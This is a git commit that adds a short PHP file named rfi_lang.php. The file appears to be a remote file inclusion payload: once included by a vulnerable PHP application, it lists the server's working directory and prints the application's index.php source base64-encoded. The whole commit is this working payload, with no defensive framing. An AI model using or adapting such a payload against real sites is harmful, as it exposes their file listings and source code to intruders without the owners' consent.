4f1b8328916a62a74bc5446474af4feb935062ce
Pamac <francoisfoyer@hotmail.fr>
2018-05-30 15:32:05 +0200

    Add files via upload

---
+++ rfi_lang.php
@@ -0,0 +1,15 @@
+<?php
+	echo("start\n");
+	if ($handle = opendir('.')) {
+		while (false !== ($entry = readdir($handle))) {
+			if ($entry != "." && $entry != "..") {
+				echo "$entry"."<br>";
+			}
+		}
+		closedir($handle);
+	}
+	echo ("middle");
+	$content = file_get_contents("./index.php");
+	echo base64_encode($content)."\n";
+	echo("end\n");
+?>
